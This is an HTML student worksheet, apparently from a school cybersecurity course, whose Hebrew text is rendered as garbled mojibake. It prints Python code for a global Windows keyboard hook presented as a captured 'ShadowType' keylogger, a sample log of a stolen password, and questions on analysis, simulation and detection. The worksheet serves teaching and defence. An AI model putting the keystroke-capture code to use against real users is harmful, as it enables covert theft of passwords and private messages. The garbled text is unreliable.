<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>×ª×¨×’×™×œ: ××‘×¦×¢ ×¦×œ ×“×™×’×™×˜×œ×™ ğŸ•µï¸â€â™‚ï¸</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .header p {
            font-size: 1.2em;
            opacity: 0.9;
        }

        .student-info {
            background: #f8f9fa;
            padding: 30px;
            border-bottom: 3px solid #667eea;
        }

        .student-info input {
            width: 100%;
            padding: 15px;
            font-size: 1.1em;
            border: 2px solid #667eea;
            border-radius: 10px;
            text-align: right;
            transition: all 0.3s;
        }

        .student-info input:focus {
            outline: none;
            border-color: #764ba2;
            box-shadow: 0 0 0 3px rgba(118, 75, 162, 0.1);
        }

        .content {
            padding: 40px;
        }

        .section {
            margin-bottom: 40px;
            padding: 30px;
            background: #f8f9fa;
            border-radius: 15px;
            border-right: 5px solid #667eea;
        }

        .section h2 {
            color: #1e3c72;
            margin-bottom: 20px;
            font-size: 1.8em;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .section h3 {
            color: #2a5298;
            margin: 20px 0 10px 0;
            font-size: 1.3em;
        }

        .code-block {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            direction: ltr;
            text-align: left;
        }

        .code-block pre {
            margin: 0;
            white-space: pre;
        }

        .question {
            background: white;
            padding: 20px;
            margin: 15px 0;
            border-radius: 10px;
            border-right: 4px solid #764ba2;
        }

        .question-label {
            font-weight: bold;
            color: #1e3c72;
            margin-bottom: 10px;
            font-size: 1.1em;
        }

        textarea {
            width: 100%;
            min-height: 120px;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-family: inherit;
            font-size: 1em;
            resize: vertical;
            transition: all 0.3s;
        }

        textarea:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .warning-box {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }

        .warning-box h3 {
            color: #856404;
            margin-bottom: 10px;
        }

        .warning-box ul {
            margin-right: 20px;
            color: #856404;
        }

        .button-container {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
        }

        button {
            padding: 15px 40px;
            font-size: 1.1em;
            font-weight: bold;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
            color: white;
        }

        .save-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }

        .save-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }

        .load-btn {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
        }

        .load-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(17, 153, 142, 0.4);
        }

        .clear-btn {
            background: linear-gradient(135deg, #ee0979 0%, #ff6a00 100%);
        }

        .clear-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(238, 9, 121, 0.4);
        }

        .progress-indicator {
            background: white;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
            color: #667eea;
        }

        .emoji {
            font-size: 1.2em;
        }

        @media (max-width: 768px) {
            .header h1 {
                font-size: 1.8em;
            }
            
            .content {
                padding: 20px;
            }
            
            .section {
                padding: 20px;
            }
            
            .button-container {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸ•µï¸â€â™‚ï¸ ×ª×¨×’×™×œ: ××‘×¦×¢ ×¦×œ ×“×™×’×™×˜×œ×™</h1>
            <p>× ×™×ª×•×— Keylogger ××ª×§×“× ×•×‘× ×™×™×ª ××¢×¨×›×ª ×”×’× ×”</p>
        </div>

        <div class="student-info">
            <label for="studentName" style="display: block; margin-bottom: 10px; font-size: 1.2em; font-weight: bold; color: #1e3c72;">
                ×©× ×”×ª×œ××™×“/×”:
            </label>
            <input type="text" id="studentName" placeholder="×”×›× ×¡/×™ ××ª ×©××š ×”××œ×..." required>
        </div>

        <div class="content">
            <div class="progress-indicator" id="progressIndicator">
                ×˜×¨× ×”×ª×—×œ×ª ×”×ª×¨×’×™×œ
            </div>

            <!-- ×¨×§×¢ ×¡×™×¤×•×¨×™ -->
            <div class="section">
                <h2>ğŸ“– ×¨×§×¢ ×¡×™×¤×•×¨×™</h2>
                <p style="line-height: 1.8; font-size: 1.1em;">
                    ××ª× ×—×•×§×¨×™ ×¡×™×™×‘×¨ ×‘×™×—×™×“×ª ××•×“×™×¢×™×Ÿ ××™×•×—×“×ª. ×œ××—×¨×•× ×” ×”×ª×’×œ×” malware ××ª×§×“× ×‘×©× <strong>"ShadowType"</strong> 
                    ×©××ª×§×™×Ÿ hooks ×’×œ×•×‘×œ×™×™× ×¢×œ ××—×©×‘×™ ×™×¢×“ ×•××ª×¢×“ ×›×œ ×œ×—×™×¦×ª ××§×© - ×›×•×œ×œ ×¡×™×¡×××•×ª, ×”×•×“×¢×•×ª ××™×©×™×•×ª ×•××™×“×¢ ×¨×’×™×©.
                </p>
                <p style="line-height: 1.8; font-size: 1.1em; margin-top: 15px;">
                    <strong>×”××©×™××” ×©×œ×›×:</strong> ×œ×”×‘×™×Ÿ ××™×š ×”× ×©×§ ×”×–×” ×¢×•×‘×“, ×•×œ×‘× ×•×ª ××¢×¨×›×ª ×”×’× ×” × ×’×“×•! ğŸ›¡ï¸
                </p>
            </div>

            <!-- ×”×§×•×“ ×©× ×ª×¤×¡ -->
            <div class="section">
                <h2>ğŸ’» ×”×§×•×“ ×”××¡×•×›×Ÿ ×©× ×ª×¤×¡</h2>
                <p style="margin-bottom: 15px;">×–×”×• ×”×§×•×“ ×”×××™×ª×™ ×©×œ ×”-malware ×©×¦×•×•×ª ×”×¡×™×™×‘×¨ ×©×œ× ×• ×ª×¤×¡:</p>
                <div class="code-block">
                    <pre>import win32api
import win32con
import win32gui

# ××©×ª× ×” ×’×œ×•×‘×œ×™ ×œ×©××™×¨×ª ×”-hook
hook_id = None
pressed_keys = []

def keyboard_callback(nCode, wParam, lParam):
    """
    ×¤×•× ×§×¦×™×” ×©× ×§×¨××ª ×‘×›×œ ×œ×—×™×¦×ª ××§×© ×‘××¢×¨×›×ª!
    ×–×” ×‘×œ×ª×™ ××¤×©×¨×™ ×¢× keyboard ××• pynput ×¨×’×™×œ
    """
    if nCode >= 0:
        if wParam == win32con.WM_KEYDOWN:
            # ×§×‘×œ×ª ×§×•×“ ×”××§×©
            vk_code = lParam[0]
            
            # ×”××¨×” ×œ×ª×•
            key_name = chr(vk_code) if 32 <= vk_code <= 126 else f"[{vk_code}]"
            
            pressed_keys.append(key_name)
            print(f"âŒ¨ï¸ × ×œ×—×¥: {key_name}")
            
            # ×× × ×œ×—×¦×• ESC, ×¢×¦×•×¨
            if vk_code == 27:  # ESC
                print("ğŸ›‘ ×¢×•×¦×¨ hook...")
                win32api.UnhookWindowsHookEx(hook_id)
                return False
    
    # ×”×¢×‘×¨ ×œ-hook ×”×‘× ×‘×©×¨×©×¨×ª
    return win32api.CallNextHookEx(hook_id, nCode, wParam, lParam)

def install_keyboard_hook():
    """
    ××ª×§×™×Ÿ hook ×’×œ×•×‘×œ×™ ×œ××§×œ×“×ª
    """
    global hook_id
    
    # ×”×ª×§× ×ª ×”-hook
    hook_id = win32api.SetWindowsHookEx(
        win32con.WH_KEYBOARD_LL,      # ×¡×•×’: Low-level keyboard
        keyboard_callback,             # ×”×¤×•× ×§×¦×™×” ×©×œ× ×•
        win32api.GetModuleHandle(None),
        0                              # 0 = global hook
    )
    
    print("âœ… Keyboard hook ×”×•×ª×§×Ÿ!")
    print("×œ×—×¥ ESC ×œ×”×¤×¡×§×”...")
    
    # ×œ×•×œ××ª ×”×•×“×¢×•×ª
    win32gui.PumpMessages()</pre>
                </div>
            </div>

            <!-- ×—×œ×§ ×': × ×™×ª×•×— ×”×§×•×“ -->
            <div class="section">
                <h2>ğŸ“‹ ×—×œ×§ ×': × ×™×ª×•×— ×”×§×•×“ (30%)</h2>
                
                <div class="question">
                    <div class="question-label">×©××œ×” 1: ××” ×”×”×‘×“×œ ×‘×™×Ÿ hook ×¨×’×™×œ ×œ-Global Hook?</div>
                    <p style="margin-bottom: 10px; color: #666;">× ×¡×” ×œ×”×¡×‘×™×¨: ×œ××” ×œ× × ×™×ª×Ÿ ×œ×¢×©×•×ª ×–××ª ×¢× keyboard ××• pynput? ××™×–×” ×”×¨×©××•×ª × ×“×¨×©×•×ª?</p>
                    <textarea id="q1_1" placeholder="×”×›× ×¡/×™ ××ª ×ª×©×•×‘×ª×š ×›××Ÿ..."></textarea>
                </div>

                <div class="question">
                    <div class="question-label">×©××œ×” 2: × ×™×ª×•×— ×”×¤×•× ×§×¦×™×” keyboard_callback</div>
                    <h3 style="font-size: 1em; margin-top: 15px;">×. ××” ×–×” WM_KEYDOWN?</h3>
                    <textarea id="q1_2a" placeholder="××” ×”××©××¢×•×ª ×©×œ WM_KEYDOWN? ××™×–×” ××™×¨×•×¢×™× × ×•×¡×¤×™× ×§×™×™××™×?"></textarea>
                    
                    <h3 style="font-size: 1em; margin-top: 15px;">×‘. ×œ××” ×‘×•×“×§×™× nCode >= 0?</h3>
                    <textarea id="q1_2b" placeholder="××” ×”××©××¢×•×ª ×©×œ ×”×‘×“×™×§×” ×”×–×•?"></textarea>
                    
                    <h3 style="font-size: 1em; margin-top: 15px;">×’. ××” ×¢×•×©×” CallNextHookEx? ×œ××” ×–×” ×§×¨×™×˜×™?</h3>
                    <textarea id="q1_2c" placeholder="×”×¡×‘×¨ ××ª ×”×—×©×™×‘×•×ª ×©×œ ×¤×•× ×§×¦×™×” ×–×•..."></textarea>
                </div>

                <div class="question">
                    <div class="question-label">×©××œ×” 3: × ×™×ª×•×— SetWindowsHookEx</div>
                    <div class="code-block" style="margin: 10px 0;">
                        <pre>hook_id = win32api.SetWindowsHookEx(
    win32con.WH_KEYBOARD_LL,
    keyboard_callback,
    win32api.GetModuleHandle(None),
    0
)</pre>
                    </div>
                    <h3 style="font-size: 1em; margin-top: 15px;">×. ××” ×”××©××¢×•×ª ×©×œ WH_KEYBOARD_LL?</h3>
                    <textarea id="q1_3a" placeholder="×”×¡×‘×¨ ××ª ×¡×•×’ ×”-hook ×”×–×”..."></textarea>
                    
                    <h3 style="font-size: 1em; margin-top: 15px;">×‘. ×œ××” ×”×¤×¨××˜×¨ ×”××—×¨×•×Ÿ ×”×•× 0?</h3>
                    <textarea id="q1_3b" placeholder="××” ×”××©××¢×•×ª ×©×œ 0 ×‘×¤×¨××˜×¨ ×–×”?"></textarea>
                </div>
            </div>

            <!-- ×—×œ×§ ×‘': ×¡×™××•×œ×¦×™×” ×‘×˜×•×—×” -->
            <div class="section">
                <h2>ğŸ’» ×—×œ×§ ×‘': ×¡×™××•×œ×¦×™×” ×‘×˜×•×—×” (40%)</h2>
                
                <div class="warning-box">
                    <h3>âš ï¸ ××–×”×¨×” ×—×©×•×‘×”!</h3>
                    <ul>
                        <li>××œ ×ª×¨×™×¦×• ××ª ×”×§×•×“ ×”××§×•×¨×™ ×œ×œ× ×”×¨×©××ª ××•×¨×”!</li>
                        <li>×¦×¨×• ×¡×™××•×œ×¦×™×” ×‘×˜×•×—×” ×¢× ×¡×¤×¨×™×™×ª keyboard ×¨×’×™×œ×”</li>
                        <li>×§×•×“ ×–×” ×œ××˜×¨×•×ª ×—×™× ×•×›×™×•×ª ×‘×œ×‘×“</li>
                    </ul>
                </div>

                <div class="question">
                    <div class="question-label">××©×™××”: ×ª××¨ ××ª ×”×ª×•×›× ×™×ª keylogger_simulator.py ×©×ª×›×ª×•×‘</div>
                    <p style="margin-bottom: 10px; color: #666;">
                        ×ª××¨ ××ª ×”××‘× ×”, ×”××—×œ×§×•×ª ×•×”×¤×•× ×§×¦×™×•×ª ×©×ª×××©. ×›×œ×•×œ:
                        <br>â€¢ ××—×œ×§×ª KeyloggerSimulator
                        <br>â€¢ ×¤×•× ×§×¦×™×•×ª ×œ×ª×™×¢×•×“ ××§×©×™×
                        <br>â€¢ ×©××™×¨×” ×œ×œ×•×’
                        <br>â€¢ ×–×™×”×•×™ ×¤×˜×¨× ×™× ×—×©×•×“×™×
                    </p>
                    <textarea id="q2_1" placeholder="×ª××¨ ××ª ×”×ª×•×›× ×™×ª ×©×œ×š ×‘×¤×™×¨×•×˜..."></textarea>
                </div>

                <div class="question">
                    <div class="question-label">×ª×›×•× ×•×ª × ×•×¡×¤×•×ª ×©×ª×•×¡×™×£ ×œ×¡×™××•×œ×¦×™×”</div>
                    <p style="margin-bottom: 10px; color: #666;">
                        ××™×œ×• ×ª×›×•× ×•×ª × ×•×¡×¤×•×ª ×ª×××©? (× ×™×ª×•×— ×¡×˜×˜×™×¡×˜×™, ×–×™×”×•×™ ×¨×¦×¤×™×, ×“×•×— HTML ×•×›×•')
                    </p>
                    <textarea id="q2_2" placeholder="×¤×¨×˜ ××ª ×”×ª×›×•× ×•×ª ×”× ×•×¡×¤×•×ª..."></textarea>
                </div>

                <div class="question">
                    <div class="question-label">×”×¢×œ×”/×”×“×‘×§ ×§×•×“ Python (××•×¤×¦×™×•× ×œ×™)</div>
                    <p style="margin-bottom: 10px; color: #666;">
                        ×× ×›×ª×‘×ª ×§×•×“, ×ª×•×›×œ ×œ×”×“×‘×™×§ ××•×ª×• ×›××Ÿ:
                    </p>
                    <textarea id="q2_code" style="min-height: 300px; font-family: 'Courier New', monospace;" placeholder="×”×“×‘×§ ××ª ×”×§×•×“ ×©×œ×š ×›××Ÿ..."></textarea>
                </div>
            </div>

            <!-- ×—×œ×§ ×’': ××¢×¨×›×ª ×”×’× ×” -->
            <div class="section">
                <h2>ğŸ›¡ï¸ ×—×œ×§ ×’': ×‘× ×™×™×ª ××¢×¨×›×ª ×”×’× ×” (30%)</h2>

                <div class="question">
                    <div class="question-label">×ª××¨ ××ª ××¢×¨×›×ª ×”-HookDetector ×©×œ×š</div>
                    <p style="margin-bottom: 10px; color: #666;">
                        ×›×™×¦×“ ×ª×–×”×” ×ª×”×œ×™×›×™× ×—×©×•×“×™×? ××™×œ×• ×©×™×˜×•×ª ×–×™×”×•×™ ×ª×©×ª××©?
                    </p>
                    <textarea id="q3_1" placeholder="×ª××¨ ××ª ×©×™×˜×•×ª ×”×–×™×”×•×™..."></textarea>
                </div>

                <div class="question">
                    <div class="question-label">××œ×’×•×¨×™×ª× ×œ×–×™×”×•×™ hooks ×—×©×•×“×™×</div>
                    <p style="margin-bottom: 10px; color: #666;">
                        ×¤×¨×˜ ××ª ×”××œ×’×•×¨×™×ª× ×©×ª×××© ×œ×–×™×”×•×™ hooks ×‘××¢×¨×›×ª
                    </p>
                    <textarea id="q3_2" placeholder="×ª××¨ ××ª ×”××œ×’×•×¨×™×ª× ×¦×¢×“ ××—×¨ ×¦×¢×“..."></textarea>
                </div>

                <div class="question">
                    <div class="question-label">×× ×™×¢×ª ×”×ª×§×¤×•×ª - ×”××œ×¦×•×ª</div>
                    <p style="margin-bottom: 10px; color: #666;">
                        ××™×œ×• ×”××œ×¦×•×ª ×ª×™×ª×Ÿ ×œ××©×ª××©×™× ×œ×”×’×Ÿ ×¢×œ ×¢×¦×× ××¤× ×™ keyloggers?
                    </p>
                    <textarea id="q3_3" placeholder="×¨×©×•× ×œ×¤×—×•×ª 5 ×”××œ×¦×•×ª ××¢×©×™×•×ª..."></textarea>
                </div>
            </div>

            <!-- ×‘×•× ×•×¡ -->
            <div class="section">
                <h2>ğŸ¯ ×‘×•× ×•×¡ ××ª×§×“× (20% × ×•×¡×¤×™×)</h2>

                <div class="question">
                    <div class="question-label">× ×™×ª×•×— ×¤×•×¨× ×–×™ - × ×™×ª×•×— ×”×œ×•×’</div>
                    <p style="margin-bottom: 10px;">× ×ª×•×Ÿ ×”×œ×•×’ ×”×‘× ××”×ª×§×¤×” ×××™×ª×™×ª:</p>
                    <div class="code-block">
                        <pre>[14:32:01] Key: g
[14:32:01] Key: m
[14:32:02] Key: a
[14:32:02] Key: i
[14:32:02] Key: l
[14:32:03] Key: [TAB]
[14:32:05] Key: p
[14:32:05] Key: a
[14:32:05] Key: s
[14:32:05] Key: s
[14:32:06] Key: w
[14:32:06] Key: 0
[14:32:06] Key: r
[14:32:06] Key: d
[14:32:06] Key: 1
[14:32:07] Key: [ENTER]</pre>
                    </div>
                    <h3 style="font-size: 1em; margin-top: 15px;">××” ×”××©×ª××© × ×™×¡×” ×œ×¢×©×•×ª?</h3>
                    <textarea id="q4_1" placeholder="× ×ª×— ××ª ×”×œ×•×’ ×•×ª××¨ ××” ×§×¨×”..."></textarea>
                    
                    <h3 style="font-size: 1em; margin-top: 15px;">××™×š ×”×™×™×ª ×××œ×™×¥ ×œ×• ×œ×”×’×Ÿ ×¢×œ ×¢×¦××•?</h3>
                    <textarea id="q4_2" placeholder="×”××œ×¦×•×ª ×¡×¤×¦×™×¤×™×•×ª ×œ××§×¨×” ×–×”..."></textarea>
                </div>

                <div class="question">
                    <div class="question-label">××¦×’×ª Ethical Hacking - ×ª×•×›×Ÿ</div>
                    <p style="margin-bottom: 10px; color: #666;">
                        ×ª××¨ ××ª ×”×ª×•×›×Ÿ ×©×œ ××¦×’×ª "××™×š ×œ×”×’×Ÿ ×¢×œ ×¢×¦××š ×-Keyloggers" (5 ×“×§×•×ª)
                    </p>
                    <textarea id="q4_3" placeholder="×¤×¨×˜ ××ª × ×•×©××™ ×”××¦×’×ª, ×˜×™×¤×™× ××¢×©×™×™×, ×›×œ×™× ××•××œ×¦×™×..."></textarea>
                </div>
            </div>

            <!-- ×¡×™×›×•× ×•×”×¢×¨×•×ª -->
            <div class="section">
                <h2>ğŸ“ ×¡×™×›×•× ×•×”×¢×¨×•×ª ××™×©×™×•×ª</h2>
                
                <div class="question">
                    <div class="question-label">××” ×œ××“×ª ××ª×¨×’×™×œ ×–×”?</div>
                    <textarea id="summary_1" placeholder="×©×ª×£/×™ ××ª ×”×ª×•×‘× ×•×ª ×©×œ×š..."></textarea>
                </div>

                <div class="question">
                    <div class="question-label">×”×× ×”×™×• ×§×©×™×™×? ××™×š ×”×ª×’×‘×¨×ª ×¢×œ×™×”×?</div>
                    <textarea id="summary_2" placeholder="×ª××¨ ××ª ×”××ª×’×¨×™× ×•×”×¤×ª×¨×•× ×•×ª..."></textarea>
                </div>

                <div class="question">
                    <div class="question-label">×”×¢×¨×•×ª × ×•×¡×¤×•×ª ×œ××•×¨×”</div>
                    <textarea id="summary_3" placeholder="×›×œ ×“×‘×¨ × ×•×¡×£ ×©×ª×¨×¦×” ×œ×©×ª×£..."></textarea>
                </div>
            </div>

            <!-- ×›×¤×ª×•×¨×™ ×©××™×¨×” -->
            <div class="button-container">
                <button class="save-btn" onclick="saveToJSON()">
                    ğŸ’¾ ×©××•×¨ ×ª×©×•×‘×•×ª ×œ-JSON
                </button>
                <button class="load-btn" onclick="loadFromJSON()">
                    ğŸ“‚ ×˜×¢×Ÿ ×ª×©×•×‘×•×ª ×-JSON
                </button>
                <button class="clear-btn" onclick="clearAll()">
                    ğŸ—‘ï¸ × ×§×” ×”×›×œ
                </button>
            </div>
        </div>
    </div>

    <script>
        // ×¢×“×›×•×Ÿ ××™× ×“×™×§×˜×•×¨ ×”×ª×§×“××•×ª
        function updateProgress() {
            const textareas = document.querySelectorAll('textarea');
            const filled = Array.from(textareas).filter(t => t.value.trim().length > 0).length;
            const total = textareas.length;
            const percentage = Math.round((filled / total) * 100);
            
            const indicator = document.getElementById('progressIndicator');
            indicator.textContent = `×”×ª×§×“××•×ª: ${filled}/${total} ×©××œ×•×ª (${percentage}%)`;
            indicator.style.background = `linear-gradient(90deg, #667eea ${percentage}%, white ${percentage}%)`;
        }

        // ×”××–× ×” ×œ×©×™× ×•×™×™×
        document.querySelectorAll('textarea').forEach(textarea => {
            textarea.addEventListener('input', updateProgress);
        });

        document.getElementById('studentName').addEventListener('input', updateProgress);

        // ×©××™×¨×” ×œ-JSON
        function saveToJSON() {
            const studentName = document.getElementById('studentName').value.trim();
            
            if (!studentName) {
                alert('âš ï¸ × × ×œ×”×–×™×Ÿ ××ª ×©× ×”×ª×œ××™×“/×” ×œ×¤× ×™ ×”×©××™×¨×”!');
                document.getElementById('studentName').focus();
                return;
            }

            const data = {
                studentName: studentName,
                submissionDate: new Date().toISOString(),
                answers: {
                    part_a: {
                        q1_hook_difference: document.getElementById('q1_1').value,
                        q2_callback_analysis: {
                            wm_keydown: document.getElementById('q1_2a').value,
                            ncode_check: document.getElementById('q1_2b').value,
                            call_next_hook: document.getElementById('q1_2c').value
                        },
                        q3_set_hook: {
                            wh_keyboard_ll: document.getElementById('q1_3a').value,
                            zero_parameter: document.getElementById('q1_3b').value
                        }
                    },
                    part_b: {
                        simulator_description: document.getElementById('q2_1').value,
                        additional_features: document.getElementById('q2_2').value,
                        code: document.getElementById('q2_code').value
                    },
                    part_c: {
                        hook_detector: document.getElementById('q3_1').value,
                        detection_algorithm: document.getElementById('q3_2').value,
                        prevention_recommendations: document.getElementById('q3_3').value
                    },
                    bonus: {
                        forensic_analysis: document.getElementById('q4_1').value,
                        protection_advice: document.getElementById('q4_2').value,
                        presentation_content: document.getElementById('q4_3').value
                    },
                    summary: {
                        learning: document.getElementById('summary_1').value,
                        challenges: document.getElementById('summary_2').value,
                        notes: document.getElementById('summary_3').value
                    }
                }
            };

            const jsonStr = JSON.stringify(data, null, 2);
            const blob = new Blob([jsonStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            
            const fileName = `keylogger_exercise_${studentName.replace(/\s+/g, '_')}_${new Date().toISOString().split('T')[0]}.json`;
            a.href = url;
            a.download = fileName;
            a.click();
            
            URL.revokeObjectURL(url);
            alert('âœ… ×”×§×•×‘×¥ × ×©××¨ ×‘×”×¦×œ×—×”!\n\n×©× ×”×§×•×‘×¥: ' + fileName);
        }

        // ×˜×¢×™× ×” ×-JSON
        function loadFromJSON() {
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = '.json';
            
            input.onchange = e => {
                const file = e.target.files[0];
                const reader = new FileReader();
                
                reader.onload = event => {
                    try {
                        const data = JSON.parse(event.target.result);
                        
                        // ×˜×¢×™× ×ª ×©× ×”×ª×œ××™×“
                        document.getElementById('studentName').value = data.studentName || '';
                        
                        // ×˜×¢×™× ×ª ×ª×©×•×‘×•×ª ×—×œ×§ ×'
                        document.getElementById('q1_1').value = data.answers.part_a.q1_hook_difference || '';
                        document.getElementById('q1_2a').value = data.answers.part_a.q2_callback_analysis.wm_keydown || '';
                        document.getElementById('q1_2b').value = data.answers.part_a.q2_callback_analysis.ncode_check || '';
                        document.getElementById('q1_2c').value = data.answers.part_a.q2_callback_analysis.call_next_hook || '';
                        document.getElementById('q1_3a').value = data.answers.part_a.q3_set_hook.wh_keyboard_ll || '';
                        document.getElementById('q1_3b').value = data.answers.part_a.q3_set_hook.zero_parameter || '';
                        
                        // ×˜×¢×™× ×ª ×ª×©×•×‘×•×ª ×—×œ×§ ×‘'
                        document.getElementById('q2_1').value = data.answers.part_b.simulator_description || '';
                        document.getElementById('q2_2').value = data.answers.part_b.additional_features || '';
                        document.getElementById('q2_code').value = data.answers.part_b.code || '';
                        
                        // ×˜×¢×™× ×ª ×ª×©×•×‘×•×ª ×—×œ×§ ×’'
                        document.getElementById('q3_1').value = data.answers.part_c.hook_detector || '';
                        document.getElementById('q3_2').value = data.answers.part_c.detection_algorithm || '';
                        document.getElementById('q3_3').value = data.answers.part_c.prevention_recommendations || '';
                        
                        // ×˜×¢×™× ×ª ×‘×•× ×•×¡
                        document.getElementById('q4_1').value = data.answers.bonus.forensic_analysis || '';
                        document.getElementById('q4_2').value = data.answers.bonus.protection_advice || '';
                        document.getElementById('q4_3').value = data.answers.bonus.presentation_content || '';
                        
                        // ×˜×¢×™× ×ª ×¡×™×›×•×
                        document.getElementById('summary_1').value = data.answers.summary.learning || '';
                        document.getElementById('summary_2').value = data.answers.summary.challenges || '';
                        document.getElementById('summary_3').value = data.answers.summary.notes || '';
                        
                        updateProgress();
                        alert('âœ… ×”×ª×©×•×‘×•×ª × ×˜×¢× ×• ×‘×”×¦×œ×—×”!');
                    } catch (error) {
                        alert('âŒ ×©×’×™××” ×‘×˜×¢×™× ×ª ×”×§×•×‘×¥: ' + error.message);
                    }
                };
                
                reader.readAsText(file);
            };
            
            input.click();
        }

        // × ×™×§×•×™ ×”×›×œ
        function clearAll() {
            if (confirm('âš ï¸ ×”×× ××ª×” ×‘×˜×•×— ×©×‘×¨×¦×•× ×š ×œ××—×•×§ ××ª ×›×œ ×”×ª×©×•×‘×•×ª?\n\n×¤×¢×•×œ×” ×–×• ××™× ×” × ×™×ª× ×ª ×œ×‘×™×˜×•×œ!')) {
                document.getElementById('studentName').value = '';
                document.querySelectorAll('textarea').forEach(textarea => {
                    textarea.value = '';
                });
                updateProgress();
                alert('ğŸ—‘ï¸ ×›×œ ×”×ª×©×•×‘×•×ª × ××—×§×•!');
            }
        }

        // ×¢×“×›×•×Ÿ ×¨××©×•× ×™
        updateProgress();

        // ×©××™×¨×” ××•×˜×•××˜×™×ª ×‘-localStorage ×›×œ 30 ×©× ×™×•×ª
        setInterval(() => {
            const studentName = document.getElementById('studentName').value.trim();
            if (studentName) {
                const autoSave = {
                    timestamp: new Date().toISOString(),
                    studentName: studentName,
                    textareas: {}
                };
                
                document.querySelectorAll('textarea').forEach(textarea => {
                    autoSave.textareas[textarea.id] = textarea.value;
                });
                
                localStorage.setItem('keylogger_exercise_autosave', JSON.stringify(autoSave));
            }
        }, 30000);

        // ×˜×¢×™× ×” ××•×˜×•××˜×™×ª ×‘×¢×ª ×˜×¢×™× ×ª ×”×¢××•×“
        window.addEventListener('load', () => {
            const autoSave = localStorage.getItem('keylogger_exercise_autosave');
            if (autoSave) {
                try {
                    const data = JSON.parse(autoSave);
                    const timeDiff = (new Date() - new Date(data.timestamp)) / 1000 / 60; // ×‘×“×§×•×ª
                    
                    if (timeDiff < 60) { // ×× ×¤×—×•×ª ××©×¢×”
                        if (confirm(`× ××¦× ×©××™×¨×” ××•×˜×•××˜×™×ª ×-${Math.round(timeDiff)} ×“×§×•×ª\n×œ×ª×œ××™×“/×”: ${data.studentName}\n\n×”×× ×œ×˜×¢×•×Ÿ ××•×ª×”?`)) {
                            document.getElementById('studentName').value = data.studentName;
                            Object.keys(data.textareas).forEach(id => {
                                const textarea = document.getElementById(id);
                                if (textarea) {
                                    textarea.value = data.textareas[id];
                                }
                            });
                            updateProgress();
                        }
                    }
                } catch (e) {
                    console.error('Error loading autosave:', e);
                }
            }
        });
    </script>
</body>
</html>